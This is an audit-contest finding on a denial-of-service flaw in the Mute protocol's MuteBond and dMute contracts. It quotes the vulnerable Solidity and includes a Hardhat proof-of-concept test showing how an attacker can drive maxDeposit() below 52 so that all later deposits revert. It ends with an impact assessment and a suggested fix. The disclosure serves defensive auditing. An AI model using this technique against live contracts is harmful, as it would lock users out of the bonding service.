## Tags

- bug
- 2 (Med Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- M-05

# [MuteBond is susceptible to DOS](https://github.com/code-423n4/2023-03-mute-findings/issues/22) 

# Lines of code

https://github.com/code-423n4/2023-03-mute/blob/main/contracts/bonds/MuteBond.sol#L179
https://github.com/code-423n4/2023-03-mute/blob/main/contracts/dao/dMute.sol#L75-L77
https://github.com/code-423n4/2023-03-mute/blob/main/contracts/dao/dMute.sol#L57


# Vulnerability details

## Proof of Concept
Observe that if timeToTokens is called with _lock_time = 1 week, _amount < 52, it will return 0.
https://github.com/code-423n4/2023-03-mute/blob/main/contracts/dao/dMute.sol#L57
```
function timeToTokens(uint256 _amount, uint256 _lock_time) internal pure returns (uint256){
        uint256 week_time = 1 weeks;
        uint256 max_lock = 52 weeks;

        require(_lock_time >= week_time, "dMute::Lock: INSUFFICIENT_TIME_PARAM");
        require(_lock_time <= max_lock, "dMute::Lock: INSUFFICIENT_TIME_PARAM");

        // amount * % of time locked up from min to max
        uint256 base_tokens = _amount.mul(_lock_time.mul(10**18).div(max_lock)).div(10**18);
        // apply % min max bonus
        //uint256 boosted_tokens = base_tokens.mul(lockBonus(lock_time)).div(10**18);

        return base_tokens;
    }
```

This causes lockTo to revert.
https://github.com/code-423n4/2023-03-mute/blob/main/contracts/dao/dMute.sol#L75-L77
```
 function LockTo(uint256 _amount, uint256 _lock_time, address to) public nonReentrant {
        require(IERC20(MuteToken).balanceOf(msg.sender) >= _amount, "dMute::Lock: INSUFFICIENT_BALANCE");

        //transfer tokens to this contract
        IERC20(MuteToken).transferFrom(msg.sender, address(this), _amount);

        // calculate dTokens to mint
        uint256 tokens_to_mint = timeToTokens(_amount, _lock_time);

        require(tokens_to_mint > 0, 'dMute::Lock: INSUFFICIENT_TOKENS_MINTED');

        _mint(to, tokens_to_mint);

        _userLocks[to].push(UserLockInfo(_amount, block.timestamp.add(_lock_time), tokens_to_mint));

        emit LockEvent(to, _amount, tokens_to_mint, _lock_time);
    }
```

The deposit function of muteBond calls lockTo with _amount = payout.
https://github.com/code-423n4/2023-03-mute/blob/main/contracts/bonds/MuteBond.sol#L179
`IDMute(dMuteToken).LockTo(payout, bond_time_lock, _depositor);`

Observe that regardless what the inputs are, `payout <= maxDeposit()` is always satisfied after the following code segment.
https://github.com/code-423n4/2023-03-mute/blob/main/contracts/bonds/MuteBond.sol#L155-L164
```
        uint payout = payoutFor( value );
        if(max_buy == true){
          value = maxPurchaseAmount();
          payout = maxDeposit();
        } else {
          // safety checks for custom purchase
          require( payout >= ((10**18) / 100), "Bond too small" ); // must be > 0.01 payout token ( underflow protection )
          require( payout <= maxPayout, "Bond too large"); // size protection because there is no slippage
          require( payout <= maxDeposit(), "Deposit too large"); // size protection because there is no slippage
        }
```

So, if an attacker manipulates the muteBond to get maxDeposit() < 52, deposit will always fail.
Please add the following test case to bonds.ts and run it with `npm run test-bond`
Note that if the bond price is too high (> 52e18), then this won't always be possible ([because payout will change by bondPrice every time we increment/decrement value](https://github.com/code-423n4/2023-03-mute/blob/main/contracts/bonds/MuteBond.sol#L242)). So in my POC, I set the price range to be (1e18 - 2e18), which I believe are reasonable values as well.

```
it('Bond DOS', async function () {

    await bondContract.setStartPrice(new BigNumber(1).times(Math.pow(10,18)).toFixed())
    await bondContract.setMaxPrice(new BigNumber(2).times(Math.pow(10,18)).toFixed())
    await bondContract.setMaxPayout(new BigNumber(100).times(Math.pow(10,18)).toFixed())
    
    // ideally, the following line is what I had in mind
    // var val = new BigNumber((await bondContract.maxPurchaseAmount()).toString()).minus(1).toFixed()
    // but due to timing issues I couldn't get it to work (I'm not very familiar with hardhat)

    // so I just ran this to get the value for the next line
    // await time.increase(1)
    // console.log(await bondContract.maxPurchaseAmount());


    var val = new BigNumber("99998511926905849653").toFixed();
    
    console.log("before:")
    console.log(await bondContract.maxDeposit())
    /*
    console.log(await bondContract.payoutFor(val))
    console.log(await bondContract.maxPayout())
    console.log((await bondContract.maxPurchaseAmount()))
    */
    
    await bondContract.connect(buyer1).deposit(val, buyer1.address, false)

    console.log("after:")
    console.log(await bondContract.maxDeposit())
    /*
    console.log(await bondContract.payoutFor(val))
    console.log(await bondContract.maxPayout())
    console.log((await bondContract.maxPurchaseAmount()))
    */

    await expect(
      bondContract.connect(buyer1).deposit(1, buyer1.address, false)
    ).to.be.reverted;
    
    
    await expect(
      bondContract.connect(buyer1).deposit(1, buyer1.address, true)
    ).to.be.reverted;
    

    await expect(
      bondContract.connect(buyer1).deposit(new BigNumber(1).times(Math.pow(10,18)).toFixed(), buyer1.address, false)
    ).to.be.reverted;

    await expect(
      bondContract.connect(buyer1).deposit(new BigNumber(1).times(Math.pow(10,18)).toFixed(), buyer1.address, true)
    ).to.be.reverted;
  })
```


## Impact
This vulnerability causes deposit to fail indefinitely. That being said, the contract itself doesn't seem to store funds, and it looks like there are ways for the admin to manually fix the DOS (e.g. deploy a new contract, set startPrice / maxPrice). So overall, I would say it warrants a medium severity.

## Tools Used
Manual Review, Hardhat

## Recommended Mitigation Steps
Start a new epoch if maxDeposit() is smaller than a certain threshold.